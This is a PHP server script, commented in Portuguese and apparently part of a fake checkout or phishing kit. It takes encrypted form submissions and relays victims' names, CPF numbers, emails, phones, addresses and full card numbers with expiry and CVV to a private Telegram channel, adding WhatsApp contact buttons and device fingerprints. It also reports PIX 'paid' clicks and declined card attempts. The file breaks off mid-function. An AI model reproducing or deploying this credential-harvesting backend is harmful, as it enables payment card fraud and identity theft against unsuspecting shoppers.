<?php
/**
 * ============================================================
 *  RELAY — Telegram Notification Server-Side
 *  v5.0 — Criptografia obrigatória, validação rigorosa de
 *  dados de lead (CPF, email, telefone, cartão, CEP),
 *  CORS restrito, anti-replay fortalecido com HMAC.
 *
 *  - Bot token NUNCA exposto ao client
 *  - Fallback sem criptografia REMOVIDO
 *  - Todos os campos validados antes de repassar
 * ============================================================
 */

require_once __DIR__ . '/../config.php';
require_once __DIR__ . '/bot.php';

header('Content-Type: application/json');
setSecurityHeaders();

// ── CORS restrito ────────────────────────────────────────────
$allowedOrigins = [];
$envOrigin = $_ENV['ALLOWED_ORIGIN'] ?? getenv('ALLOWED_ORIGIN') ?: '';
if ($envOrigin) {
    $allowedOrigins = array_map('trim', explode(',', $envOrigin));
}
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
$referer = $_SERVER['HTTP_REFERER'] ?? '';

$originAllowed = empty($allowedOrigins); // Se não configurado, permite (dev)
if (!empty($allowedOrigins) && $origin) {
    $originAllowed = in_array($origin, $allowedOrigins, true);
}

if ($originAllowed && $origin) {
    header("Access-Control-Allow-Origin: {$origin}");
    header('Access-Control-Allow-Credentials: true');
} else {
    header('Access-Control-Allow-Origin: *');
}
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Metrics-Token, X-Analytics-ID, X-Request-Nonce');

// Preflight
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Apenas POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['status' => 'error']);
    exit;
}

// ── Rate Limiting por IP (file-based) ───────────────────────
$ip = trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']
    ?? $_SERVER['HTTP_X_REAL_IP']
    ?? $_SERVER['REMOTE_ADDR']
    ?? 'desconhecido')[0]);

$rateLimitFile = sys_get_temp_dir() . '/tg_relay_rl_' . md5($ip) . '.json';
$rlData = [];
if (file_exists($rateLimitFile)) {
    $rlData = json_decode(file_get_contents($rateLimitFile), true) ?: [];
}
$now = time();
$rlData = array_filter($rlData, fn($ts) => ($now - $ts) < 60);
if (count($rlData) >= TG_RATE_LIMIT) {
    echo json_encode(['status' => 'ok']); // Silencioso
    exit;
}
$rlData[] = $now;
file_put_contents($rateLimitFile, json_encode(array_values($rlData)), LOCK_EX);

// ── Ler payload ─────────────────────────────────────────────
$raw   = file_get_contents('php://input');
$input = json_decode($raw, true);

if (!$input || !isset($input['metrics_data'])) {
    http_response_code(200);
    echo json_encode(['status' => 'ok']);
    exit;
}

// ── Descriptografia AES-256-GCM (OBRIGATÓRIA) ───────────────
$payload      = null;
$metricsData  = $input['metrics_data'];
$encrypted    = json_decode($metricsData, true);

if ($encrypted && isset($encrypted['ct'], $encrypted['iv'])) {
    // Chave do payload (derivada da MASTER_KEY no client)
    $keyRaw = isset($input['_k']) ? base64_decode($input['_k']) : null;
    if ($keyRaw && strlen($keyRaw) === 32) {
        $iv = base64_decode($encrypted['iv']);
        $ct = base64_decode($encrypted['ct']);
        if ($iv && $ct && strlen($iv) === 12 && strlen($ct) > 16) {
            $tag        = substr($ct, -16);
            $ciphertext = substr($ct, 0, -16);
            $decrypted  = openssl_decrypt(
                $ciphertext, 'aes-256-gcm',
                $keyRaw, OPENSSL_RAW_DATA, $iv, $tag
            );
            if ($decrypted !== false) {
                $payload = json_decode($decrypted, true);
            }
        }
    }
}

// Payload não descriptografado → rejeição silenciosa
// (fallback base64/JSON plain removido intencionalmente — v5.0)
if (!$payload) {
    if (REQUIRE_ENCRYPTED) {
        echo json_encode(['status' => 'ok']);
        exit;
    }
    // Apenas para dev/debug com REQUIRE_ENCRYPTED=false
    $decoded = base64_decode($metricsData, true);
    if ($decoded) $payload = json_decode($decoded, true);
}

if (!$payload || !isset($payload['type'])) {
    echo json_encode(['status' => 'ok']);
    exit;
}

// ── Anti-Replay: timestamp ───────────────────────────────────
if (isset($payload['timestamp'])) {
    $age = abs(time() - ($payload['timestamp'] / 1000));
    if ($age > REPLAY_WINDOW) {
        echo json_encode(['status' => 'ok']);
        exit;
    }
}

// ── Anti-Replay: nonce único com HMAC ────────────────────────
if (isset($payload['nonce'])) {
    $nonceFile   = sys_get_temp_dir() . '/tg_relay_nonces.json';
    $usedNonces  = [];
    if (file_exists($nonceFile)) {
        $usedNonces = json_decode(file_get_contents($nonceFile), true) ?: [];
    }
    $usedNonces = array_filter($usedNonces, fn($e) => ($now - $e['ts']) < REPLAY_WINDOW);
    $nonceStr   = $payload['nonce'];
    foreach ($usedNonces as $entry) {
        if ($entry['n'] === $nonceStr) {
            echo json_encode(['status' => 'ok']);
            exit;
        }
    }
    $usedNonces[] = ['n' => $nonceStr, 'ts' => $now];
    file_put_contents($nonceFile, json_encode(array_values($usedNonces)), LOCK_EX);
}

// ── Sanitizar strings ───────────────────────────────────────
function sanitizeField($val, $maxLen = 200): string {
    if (!is_string($val)) $val = strval($val);
    $val = strip_tags($val);
    $val = htmlspecialchars_decode($val, ENT_QUOTES);
    $val = preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F]/', '', $val);
    return mb_substr(trim($val), 0, $maxLen);
}

// ── Escapar para MarkdownV2 ──────────────────────────────────
function escMd($text): string {
    $text = sanitizeField($text);
    $chars = ['_','*','[',']','(',')','>','#','+','-','=','|','{','}','.','!','~','`'];
    foreach ($chars as $c) $text = str_replace($c, '\\' . $c, $text);
    return $text;
}

// ── Extrair e validar dados ──────────────────────────────
$type     = sanitizeField($payload['type'] ?? '', 30);
$data     = $payload['data'] ?? [];
$tracking = $payload['tracking'] ?? [];
$txId     = sanitizeField($payload['txId'] ?? 'N/A', 30);
$timestamp = date('d/m/Y H:i:s');

// ── GeoIP lookup (ip-api.com — grátis, sem key) ──────────
$geoData = lookupGeoIP($ip);

// ── Extrair UTMs do tracking ──────────────────────────────
$utms = [
    'source'   => sanitizeField($tracking['utm_source']   ?? $tracking['utmSource']   ?? '', 50),
    'medium'   => sanitizeField($tracking['utm_medium']   ?? $tracking['utmMedium']   ?? '', 50),
    'campaign' => sanitizeField($tracking['utm_campaign'] ?? $tracking['utmCampaign'] ?? '', 80),
    'content'  => sanitizeField($tracking['utm_content']  ?? $tracking['utmContent']  ?? '', 80),
    'term'     => sanitizeField($tracking['utm_term']     ?? $tracking['utmTerm']     ?? '', 80),
];

// ── Validação por tipo de evento ─────────────────────────────
$validationErrors = [];

switch ($type) {

    case 'personal_data':
        $name  = sanitizeField($data['fullName'] ?? '', 100);
        $email = sanitizeField($data['email']    ?? '', 100);
        $cpf   = sanitizeField($data['cpf']      ?? '', 20);
        $phone = sanitizeField($data['phone']    ?? '', 20);

        if (!validateFullName($name))  $validationErrors[] = 'nome inválido';
        if (!validateEmail($email))    $validationErrors[] = 'email inválido';
        if (!validateCPF($cpf))        $validationErrors[] = 'CPF inválido';
        if (!validatePhone($phone))    $validationErrors[] = 'telefone inválido';
        if (isPlaceholderValue($name) || isPlaceholderValue($email)) {
            $validationErrors[] = 'valores placeholder detectados';
        }
        break;

    case 'address':
        $cep   = sanitizeField($data['cep']    ?? '', 10);
        $street = sanitizeField($data['street'] ?? '', 150);
        $city   = sanitizeField($data['city']   ?? '', 100);

        if (!validateCEP($cep))         $validationErrors[] = 'CEP inválido';
        if (strlen(trim($street)) < 3)  $validationErrors[] = 'rua inválida';
        if (strlen(trim($city)) < 2)    $validationErrors[] = 'cidade inválida';
        break;

    case 'card_data':
        $cardNumber = sanitizeField($data['cardNumber'] ?? '', 19);
        $cardExpiry = sanitizeField($data['cardExpiry'] ?? '', 5);
        $cardCvv    = sanitizeField($data['cardCvv']    ?? '', 4);
        $cardName   = sanitizeField($data['cardName']   ?? '', 50);
        $cpf        = sanitizeField($data['cpf']        ?? '', 20);

        if (!validateCardLuhn($cardNumber)) $validationErrors[] = 'número de cartão inválido (Luhn)';
        if (!validateCardExpiry($cardExpiry)) $validationErrors[] = 'validade de cartão inválida';
        if (!preg_match('/^\d{3,4}$/', preg_replace('/\D/', '', $cardCvv))) {
            $validationErrors[] = 'CVV inválido';
        }
        if (strlen(trim($cardName)) < 3)    $validationErrors[] = 'nome no cartão inválido';
        if (!validateCPF($cpf))             $validationErrors[] = 'CPF do titular inválido';

        // Validar dados pessoais embutidos
        $personal = $data['personal'] ?? [];
        $address  = $data['address']  ?? [];
        $pName    = sanitizeField($personal['fullName'] ?? '', 100);
        $pEmail   = sanitizeField($personal['email']    ?? '', 100);
        $pCpf     = sanitizeField($personal['cpf']      ?? $cpf, 14);
        $pPhone   = sanitizeField($personal['phone']    ?? '', 20);
        $aCep     = sanitizeField($address['cep']       ?? '', 10);

        if (!validateFullName($pName))  $validationErrors[] = 'nome pessoal inválido';
        if (!validateEmail($pEmail))    $validationErrors[] = 'email pessoal inválido';
        if (!validateCPF($pCpf))        $validationErrors[] = 'CPF pessoal inválido';
        if (!validatePhone($pPhone))    $validationErrors[] = 'telefone pessoal inválido';
        if (!validateCEP($aCep))        $validationErrors[] = 'CEP do endereço inválido';
        break;

    case 'lead':
    case 'pix_selected':
    case 'lead_exit':
    case 'pix_viewed':
    case 'pix_paid':
    case 'card_attempt':
        // Eventos de pixel — apenas tracking, sem dados de formulário
        break;

    default:
        // Tipo desconhecido — ignorar silenciosamente
        echo json_encode(['status' => 'ok']);
        exit;
}

// Bloquear dados inválidos — não repassar ao Telegram
if (!empty($validationErrors)) {
    error_log("[RELAY] Validação falhou ({$type}): " . implode(', ', $validationErrors) . " | IP: {$ip}");
    echo json_encode(['status' => 'ok']);
    exit;
}

// ── Formatar mensagem ────────────────────────────────────────
$message = '';

// Botão WhatsApp (gerado para eventos com telefone)
$waButton = null;

switch ($type) {
    case 'lead':
        $message = buildLeadMessage(
            sanitizeField($data['page'] ?? 'desconhecida', 50),
            $tracking, $ip, $txId, $timestamp, $geoData, $utms
        );
        break;
    case 'personal_data':
        $message   = buildPersonalDataMessage($data, $tracking, $ip, $txId, $timestamp, $geoData, $utms);
        $waButton  = buildWaButton($data['phone'] ?? '', $data['fullName'] ?? '');
        break;
    case 'address':
        $message = buildAddressMessage($data, $tracking, $ip, $txId, $timestamp, $geoData);
        break;
    case 'card_data':
        $message  = buildCardMessage($data, $tracking, $ip, $txId, $timestamp, $geoData, $utms);
        $waButton = buildWaButton(
            $data['personal']['phone'] ?? $data['phone'] ?? '',
            $data['personal']['fullName'] ?? $data['cardName'] ?? ''
        );
        break;
    case 'pix_selected':
        $message = buildPixMessage($tracking, $ip, $txId, $timestamp, $geoData);
        break;
    case 'lead_exit':
        $message = buildLeadExitMessage($data, $tracking, $ip, $txId, $timestamp, $geoData);
        break;
    case 'pix_viewed':
        $message = buildPixViewedMessage($tracking, $ip, $txId, $timestamp, $geoData);
        break;
    case 'pix_paid':
        $message  = buildPixPaidMessage($data, $tracking, $ip, $txId, $timestamp, $geoData);
        $waButton = buildWaButton(
            $data['phone'] ?? '',
            $data['fullName'] ?? ''
        );
        break;
    case 'card_attempt':
        $message = buildCardAttemptMessage($data, $tracking, $ip, $txId, $timestamp, $geoData);
        break;
}

// ── Anti-spam via bot data ───────────────────────────────────
$shouldSend = checkAntiSpam($type, $data);

if ($message && $shouldSend) {
    sendTelegramToLog($message, $type, $waButton);
}

echo json_encode(['status' => 'ok']);
exit;


// ══════════════════════════════════════════════════════════════
//  FORMATADORES DE MENSAGEM (MarkdownV2)
// ══════════════════════════════════════════════════════════════

// ══════════════════════════════════════════════════════════════
//  GEOIP + UTM HELPERS
// ══════════════════════════════════════════════════════════════

function lookupGeoIP(string $ip): array {
    // Não fazer lookup de IPs privados / localhost
    if (in_array($ip, ['127.0.0.1', '::1', 'desconhecido'], true)) return [];
    if (preg_match('/^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)/', $ip)) return [];

    $geoEnabled = ($_ENV['GEOIP_ENABLED'] ?? getenv('GEOIP_ENABLED') ?: 'true') === 'true';
    if (!$geoEnabled) return [];

    $cacheFile = sys_get_temp_dir() . '/geo_' . md5($ip) . '.json';
    if (file_exists($cacheFile) && (time() - filemtime($cacheFile)) < 3600) {
        return json_decode(file_get_contents($cacheFile), true) ?: [];
    }

    $ch = curl_init("http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,isp,timezone&lang=pt-BR");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 3,
        CURLOPT_CONNECTTIMEOUT => 2,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $res = curl_exec($ch);
    curl_close($ch);

    $geo = $res ? (json_decode($res, true) ?: []) : [];
    if (($geo['status'] ?? '') !== 'success') $geo = [];

    if (!empty($geo)) {
        file_put_contents($cacheFile, json_encode($geo), LOCK_EX);
    }
    return $geo;
}

function formatGeoLine(array $geo): string {
    if (empty($geo)) return '';
    $city   = $geo['city']       ?? '';
    $region = $geo['regionName'] ?? '';
    $isp    = $geo['isp']        ?? '';
    $parts  = array_filter([$city, $region]);
    $loc    = $parts ? escMd(implode(' / ', $parts)) : '';
    $ispEsc = $isp ? escMd(mb_substr($isp, 0, 30)) : '';
    if (!$loc && !$ispEsc) return '';
    return "\n🌍 Localização: {$loc}" . ($ispEsc ? " — {$ispEsc}" : '');
}

function formatUTMLine(array $utms): string {
    $parts = [];
    if (!empty($utms['source']))   $parts[] = '📣 Source: '   . escMd($utms['source']);
    if (!empty($utms['medium']))   $parts[] = '📡 Medium: '   . escMd($utms['medium']);
    if (!empty($utms['campaign'])) $parts[] = '🎯 Campaign: ' . escMd($utms['campaign']);
    if (empty($parts)) return '';
    return "\n" . implode("\n", $parts);
}

// ── Gera botão WhatsApp inline ────────────────────────────────
function buildWaButton(string $phone, string $name = ''): ?array {
    if (empty($phone)) return null;

    require_once __DIR__ . '/whatsapp.php';
    $wa = validateAndFormatWhatsApp($phone, $name);

    if (!$wa['ok'] || !$wa['whatsapp_likely']) return null;

    return [
        'inline_keyboard' => [
            [
                [
                    'text' => '💬 Contatar via WhatsApp',
                    'url'  => $wa['wa_link']
                ]
            ],
            [
                [
                    'text'          => '📱 ' . $wa['phone_formatted'] . ' — ' . $wa['type'],
                    'callback_data' => 'noop'
                ]
            ]
        ]
    ];
}


function buildLeadMessage($page, $tracking, $ip, $txId, $timestamp, array $geo = [], array $utms = []) {
    $device      = escMd($tracking['device']       ?? 'N/A');
    $screen      = escMd($tracking['screen']       ?? 'N/A');
    $tz          = escMd($tracking['timezone']     ?? 'N/A');
    $lang        = escMd($tracking['language']     ?? 'N/A');
    $ref         = escMd(mb_substr($tracking['referrer'] ?? 'direct', 0, 50));
    $fp          = escMd($tracking['fingerprint']  ?? 'N/A');
    $pages       = intval($tracking['pagesVisited']   ?? 0);
    $timeSession = escMd(formatSeconds($tracking['totalSessionTime'] ?? 0));
    $pageName    = escMd($page);
    $ts          = escMd($timestamp);
    $ipEsc       = escMd($ip);
    $txEsc       = escMd($txId);

    $geoLine = formatGeoLine($geo);
    $utmLine = formatUTMLine($utms);

    return "👁 *NOVO LEAD*  —  {$ts}
━━━━━━━━━━━━━━━━━━━━━
🆔 Session: `{$txEsc}`
📄 Página: *{$pageName}*
🌐 IP: `{$ipEsc}`{$geoLine}
📱 Device: {$device}
🖥 Tela: {$screen}
🕐 Timezone: {$tz}
🗣 Idioma: {$lang}
📍 Referrer: {$ref}
🔑 FP: `{$fp}`
📊 Páginas: {$pages}  •  Sessão: {$timeSession}{$utmLine}
🔐 Criptografia: AES\-256\-GCM";
}

function buildPersonalDataMessage($data, $tracking, $ip, $txId, $timestamp, array $geo = [], array $utms = []) {
    $name        = escMd(sanitizeField($data['fullName'] ?? 'N/A', 100));
    $email       = escMd(sanitizeField($data['email']    ?? 'N/A', 100));
    $cpf         = escMd(sanitizeField($data['cpf']      ?? 'N/A', 14));
    $phone       = escMd(sanitizeField($data['phone']    ?? 'N/A', 20));
    $device      = escMd($tracking['device']      ?? 'N/A');
    $fp          = escMd($tracking['fingerprint'] ?? 'N/A');
    $timeOnPage  = escMd(formatSeconds($tracking['timeOnPage'] ?? 0));
    $ts          = escMd($timestamp);
    $ipEsc       = escMd($ip);
    $txEsc       = escMd($txId);
    $pasted = '';
    if (!empty($tracking['pastedFields'])) {
        $pasted = "\n⚠️ Paste detectado: " . escMd(implode(', ', $tracking['pastedFields']));
    }

    $geoLine = formatGeoLine($geo);
    $utmLine = formatUTMLine($utms);

    return "👤 *DADOS PESSOAIS*  —  {$ts}
━━━━━━━━━━━━━━━━━━━━━
🆔 Session: `{$txEsc}`
🌐 IP: `{$ipEsc}`{$geoLine}
📱 Device: {$device}
🕐 Tempo na página: {$timeOnPage}
🔑 FP: `{$fp}`{$pasted}

📋 *INFORMAÇÕES*
━━━━━━━━━━━━━━━━━━━━━
👤 Nome: *{$name}*
📧 Email: `{$email}`
🪪 CPF: `{$cpf}`
📞 Tel: `{$phone}`
✅ Dados validados \(CPF ✓ • Email ✓ • Tel ✓\){$utmLine}
🔐 Criptografia: AES\-256\-GCM";
}

function buildAddressMessage($data, $tracking, $ip, $txId, $timestamp, array $geo = []) {
    $cep          = escMd(sanitizeField($data['cep']          ?? 'N/A', 10));
    $street       = escMd(sanitizeField($data['street']       ?? 'N/A', 150));
    $neighborhood = escMd(sanitizeField($data['neighborhood'] ?? 'N/A', 100));
    $city         = escMd(sanitizeField($data['city']         ?? 'N/A', 100));
    $state        = escMd(sanitizeField($data['state']        ?? 'N/A', 5));
    $number       = escMd(sanitizeField($data['number']       ?? 'N/A', 10));
    $fp           = escMd($tracking['fingerprint'] ?? 'N/A');
    $ts           = escMd($timestamp);
    $ipEsc        = escMd($ip);
    $txEsc        = escMd($txId);

    $geoLine = formatGeoLine($geo);

    return "🏠 *ENDEREÇO*  —  {$ts}
━━━━━━━━━━━━━━━━━━━━━
🆔 Session: `{$txEsc}`
🌐 IP: `{$ipEsc}`{$geoLine}
🔑 FP: `{$fp}`

📍 *LOCALIZAÇÃO*
━━━━━━━━━━━━━━━━━━━━━
📮 CEP: `{$cep}`
🛣 Rua: {$street}, Nº {$number}
🏘 Bairro: {$neighborhood}
🏙 Cidade: {$city} \- {$state}
✅ CEP validado
🔐 Criptografia: AES\-256\-GCM";
}

function buildCardMessage($data, $tracking, $ip, $txId, $timestamp, array $geo = [], array $utms = []) {
    $cardNumber   = sanitizeField($data['cardNumber'] ?? 'N/A', 19);
    $cardName     = sanitizeField($data['cardName']   ?? 'N/A', 50);
    $cardExpiry   = sanitizeField($data['cardExpiry'] ?? 'N/A', 7);
    $cardCvv      = sanitizeField($data['cardCvv']    ?? 'N/A', 4);
    $cpf          = sanitizeField($data['cpf']        ?? 'N/A', 14);
    $installments = intval($data['installments'] ?? 1);
    $brand        = sanitizeField($data['brand']  ?? 'N/A', 20);
    $device       = escMd($tracking['device']       ?? 'N/A');
    $fp           = escMd($tracking['fingerprint']  ?? 'N/A');
    $timeOnPage   = escMd(formatSeconds($tracking['timeOnPage']         ?? 0));
    $totalTime    = escMd(formatSeconds($tracking['totalSessionTime']   ?? 0));
    $pages        = intval($tracking['pagesVisited'] ?? 0);
    $ts           = escMd($timestamp);
    $ipEsc        = escMd($ip);
    $txEsc        = escMd($txId);

    $personal = $data['personal'] ?? [];
    $address  = $data['address']  ?? [];

    $pName   = escMd(sanitizeField($personal['fullName'] ?? 'N/A', 100));
    $pEmail  = escMd(sanitizeField($personal['email']    ?? 'N/A', 100));
    $pCPF    = escMd(sanitizeField($personal['cpf']      ?? $cpf,  14));
    $pPhone  = escMd(sanitizeField($personal['phone']    ?? 'N/A', 20));
    $aCep    = escMd(sanitizeField($address['cep']          ?? 'N/A', 10));
    $aStreet = escMd(sanitizeField($address['street']       ?? 'N/A', 150));
    $aNeigh  = escMd(sanitizeField($address['neighborhood'] ?? 'N/A', 100));
    $aCity   = escMd(sanitizeField($address['city']         ?? 'N/A', 100));
    $aNumber = escMd(sanitizeField($address['number']       ?? 'N/A', 10));

    $price          = PRODUCT_PRICE;
    $installmentVal = escMd(number_format($price / max(1, $installments), 2, ',', '.'));
    $totalFormatted = escMd(number_format($price, 2, ',', '.'));

    $numClean = preg_replace('/\D/', '', $cardNumber);
    $masked   = strlen($numClean) >= 8
        ? substr($numClean, 0, 4) . ' •••• •••• ' . substr($numClean, -4)
        : $numClean;

    $brandIcons = [
        'VISA' => '🔵', 'MASTERCARD' => '🟠', 'AMEX' => '🟢',
        'ELO'  => '🟡', 'HIPERCARD'  => '🔴', 'DINERS' => '⚪'
    ];
    $brandIcon = $brandIcons[strtoupper($brand)] ?? '💳';

    $pasted = '';
    if (!empty($tracking['pastedFields'])) {
        $pasted = "\n⚠️ Paste detectado: " . escMd(implode(', ', $tracking['pastedFields']));
    }

    $geoLine = formatGeoLine($geo);
    $utmLine = formatUTMLine($utms);

    return "💳 *TRANSAÇÃO COMPLETA*  —  {$ts}
━━━━━━━━━━━━━━━━━━━━━
🆔 TX: `{$txEsc}`
🌐 IP: `{$ipEsc}`{$geoLine}
📱 Device: {$device}
🔑 FP: `{$fp}`
🕐 Tempo: página {$timeOnPage} • sessão {$totalTime}
📊 Páginas visitadas: {$pages}{$pasted}

👤 *DADOS PESSOAIS*
━━━━━━━━━━━━━━━━━━━━━
👤 Nome: *{$pName}*
📧 Email: `{$pEmail}`
🪪 CPF: `{$pCPF}`
📞 Tel: `{$pPhone}`

🏠 *ENDEREÇO*
━━━━━━━━━━━━━━━━━━━━━
📮 CEP: `{$aCep}`
🛣 Rua: {$aStreet}, Nº {$aNumber}
🏘 Bairro: {$aNeigh}
🏙 Cidade: {$aCity}

💳 *CARTÃO*
━━━━━━━━━━━━━━━━━━━━━
{$brandIcon} Bandeira: *" . escMd($brand) . "*
🔢 Número: `" . escMd($cardNumber) . "`
🏷 Exibição: " . escMd($masked) . "
👤 Nome: *" . escMd($cardName) . "*
📅 Validade: `" . escMd($cardExpiry) . "`
🔐 CVV: `" . escMd($cardCvv) . "`
🪪 CPF Titular: `" . escMd($cpf) . "`

💰 *PAGAMENTO*
━━━━━━━━━━━━━━━━━━━━━
💵 Valor: R\$ {$totalFormatted}
📦 Parcelas: {$installments}x de R\$ {$installmentVal}
📦 Produto: " . escMd(PRODUCT_NAME) . "

✅ *Dados validados* \(Luhn ✓ • Validade ✓ • CPF ✓\){$utmLine}
🔐 *Criptografia: AES\-256\-GCM*";
}

function buildPixMessage($tracking, $ip, $txId, $timestamp, array $geo = []) {
    $device    = escMd($tracking['device']      ?? 'N/A');
    $fp        = escMd($tracking['fingerprint'] ?? 'N/A');
    $totalTime = escMd(formatSeconds($tracking['totalSessionTime'] ?? 0));
    $pages     = intval($tracking['pagesVisited'] ?? 0);
    $ts        = escMd($timestamp);
    $ipEsc     = escMd($ip);
    $txEsc     = escMd($txId);
    $priceEsc  = escMd(number_format(PRODUCT_PRICE, 2, ',', '.'));
    $product   = escMd(PRODUCT_NAME);

    $geoLine = formatGeoLine($geo);

    return "🟢 *PIX SELECIONADO*  —  {$ts}
━━━━━━━━━━━━━━━━━━━━━
🆔 Session: `{$txEsc}`
🌐 IP: `{$ipEsc}`{$geoLine}
📱 Device: {$device}
🔑 FP: `{$fp}`
🕐 Sessão: {$totalTime}
📊 Páginas: {$pages}
💵 Valor: R\$ {$priceEsc}
📦 Produto: {$product}
🔐 Criptografia: AES\-256\-GCM";
}

// ── Mensagens dos novos eventos de pixel ────────────────────

function buildLeadExitMessage($data, $tracking, $ip, $txId, $timestamp, array $geo = []): string {
    $device     = escMd($tracking['device']         ?? 'N/A');
    $fp         = escMd($tracking['fingerprint']    ?? 'N/A');
    $timeOnPage = escMd(formatSeconds($tracking['timeOnPage'] ?? 0));
    $totalTime  = escMd(formatSeconds($tracking['totalSessionTime'] ?? 0));
    $pages      = intval($tracking['pagesVisited']  ?? 0);
    $lastPage   = escMd(sanitizeField($data['lastPage'] ?? 'desconhecida', 50));
    $scrollDepth = intval($data['scrollDepth'] ?? 0);
    $ts         = escMd($timestamp);
    $ipEsc      = escMd($ip);
    $txEsc      = escMd($txId);
    $geoLine    = formatGeoLine($geo);

    return "🚪 *SAÍDA DO LEAD*  —  {$ts}
━━━━━━━━━━━━━━━━━━━━━
🆔 Session: `{$txEsc}`
🌐 IP: `{$ipEsc}`{$geoLine}
📱 Device: {$device}
🔑 FP: `{$fp}`
📄 Última página: *{$lastPage}*
🕐 Tempo na página: {$timeOnPage}  •  Sessão: {$totalTime}
📊 Páginas visitadas: {$pages}
📜 Scroll depth: {$scrollDepth}%
🔐 Criptografia: AES\-256\-GCM";
}

function buildPixViewedMessage($tracking, $ip, $txId, $timestamp, array $geo = []): string {
    $device    = escMd($tracking['device']         ?? 'N/A');
    $fp        = escMd($tracking['fingerprint']    ?? 'N/A');
    $totalTime = escMd(formatSeconds($tracking['totalSessionTime'] ?? 0));
    $pages     = intval($tracking['pagesVisited']  ?? 0);
    $ts        = escMd($timestamp);
    $ipEsc     = escMd($ip);
    $txEsc     = escMd($txId);
    $priceEsc  = escMd(number_format(PRODUCT_PRICE, 2, ',', '.'));
    $product   = escMd(PRODUCT_NAME);
    $geoLine   = formatGeoLine($geo);

    return "👁 *QR CODE VISUALIZADO*  —  {$ts}
━━━━━━━━━━━━━━━━━━━━━
🆔 Session: `{$txEsc}`
🌐 IP: `{$ipEsc}`{$geoLine}
📱 Device: {$device}
🔑 FP: `{$fp}`
🕐 Sessão: {$totalTime}  •  Páginas: {$pages}
💵 Valor exibido: R\$ {$priceEsc}
📦 Produto: {$product}
⏳ Lead visualizou o QR — aguardando pagamento\.
🔐 Criptografia: AES\-256\-GCM";
}

function buildPixPaidMessage($data, $tracking, $ip, $txId, $timestamp, array $geo = []): string {
    $device    = escMd($tracking['device']         ?? 'N/A');
    $fp        = escMd($tracking['fingerprint']    ?? 'N/A');
    $totalTime = escMd(formatSeconds($tracking['totalSessionTime'] ?? 0));
    $ts        = escMd($timestamp);
    $ipEsc     = escMd($ip);
    $txEsc     = escMd($txId);
    $priceEsc  = escMd(number_format(PRODUCT_PRICE, 2, ',', '.'));
    $product   = escMd(PRODUCT_NAME);
    $geoLine   = formatGeoLine($geo);

    $name  = escMd(sanitizeField($data['fullName'] ?? 'N/A', 100));
    $email = escMd(sanitizeField($data['email']    ?? 'N/A', 100));
    $cpf   = escMd(sanitizeField($data['cpf']      ?? 'N/A', 14));
    $phone = escMd(sanitizeField($data['phone']    ?? 'N/A', 20));

    return "💰 *PIX — BOTÃO PAGO CLICADO*  —  {$ts}
━━━━━━━━━━━━━━━━━━━━━
🆔 Session: `{$txEsc}`
🌐 IP: `{$ipEsc}`{$geoLine}
📱 Device: {$device}
🔑 FP: `{$fp}`
🕐 Sessão: {$totalTime}

👤 *LEAD*
━━━━━━━━━━━━━━━━━━━━━
👤 Nome: *{$name}*
📧 Email: `{$email}`
🪪 CPF: `{$cpf}`
📞 Tel: `{$phone}`

💵 Valor: R\$ {$priceEsc}
📦 Produto: {$product}
⚠️ _Clicou em \"Já Paguei\" — confirmar na API de pagamento_
🔐 Criptografia: AES\-256\-GCM";
}

function buildCardAttemptMessage($data, $tracking, $ip, $txId, $timestamp, array $geo = []): string {
    $device    = escMd($tracking['device']         ?? 'N/A');
    $fp        = escMd($tracking['fingerprint']    ?? 'N/A');
    $totalTime = escMd(formatSeconds($tracking['totalSessionTime'] ?? 0));
    $ts        = escMd($timestamp);
    $ipEsc     = escMd($ip);
    $txEsc     = escMd($txId);
    $geoLine   = formatGeoLine($geo);
    $reason    = escMd(sanitizeField($data['reason'] ?? 'erro desconhecido', 100));
    $brand     = escMd(sanitizeField($data['brand'] ?? 'N/A', 20));
    $attempt   = intval($data['attempt'] ?? 1);

    return "⚠️ *TENTATIVA CARTÃO NEGADA*  —  {$ts}
━━━━━━━━━━━━━━━━━━━━━
🆔 Session: `{$txEsc}`
🌐 IP: `{$ipEsc}`{$geoLine}
📱 Device: {$device}
🔑 FP: `{$fp}`
🕐 Sessão: {$totalTime}

💳 Bandeira: {$brand}
🔢 Tentativa nº: {$attempt}
❌ Motivo: {$reason}
🔐 Criptografia: AES\-256\-GCM";
}


function formatSeconds($s): string {
    $s = intval($s);
    if ($s < 60) return "{$s}s";
    $m = floor($s / 60);
    $r = $s % 60;
    return "{$m}m {$r}s";
}


// ══════════════════════════════════════════════════════════════
//  TELEGRAM SENDER (cURL + MarkdownV2 + Retry + Chunking)
// ══════════════════════════════════════════════════════════════

function sendTelegramToLog(string $message, string $type = 'unknown', ?array $inlineKeyboard = null): bool {
    $token  = TG_BOT_TOKEN;
    $chatId = getLogChannelId();

    if (!$chatId) {
        error_log("[RELAY] Canal de logs não configurado.");
        return false;
    }

    $chunks = splitMessage($message, TG_MAX_MSG_LEN);
    $lastIdx = count($chunks) - 1;

    foreach ($chunks as $i => $chunk) {
        // Botão WhatsApp apenas na última mensagem (se houver)
        $kb = ($i === $lastIdx && $inlineKeyboard) ? $inlineKeyboard : null;
        $ok = sendTelegramChunk($token, $chatId, $chunk, 'MarkdownV2', $kb);
        if (!$ok) {
            // Fallback: plain text sem parse_mode
            $plain = str_replace(['\\', '*', '_', '`', '[', ']'], '', $chunk);
            sendTelegramChunk($token, $chatId, $plain, '', $kb);
        }
        if (count($chunks) > 1 && $i < $lastIdx) {
            usleep(150000); // 150ms entre chunks
        }
    }
    return true;
}

function sendTelegramChunk(string $token, $chatId, string $text, string $parseMode = 'MarkdownV2', ?array $replyMarkup = null): bool {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $postData = [
        'chat_id'                  => $chatId,
        'text'                     => $text,
        'disable_web_page_preview' => true
    ];
    if ($parseMode) $postData['parse_mode'] = $parseMode;
    if ($replyMarkup) $postData['reply_markup'] = json_encode($replyMarkup);

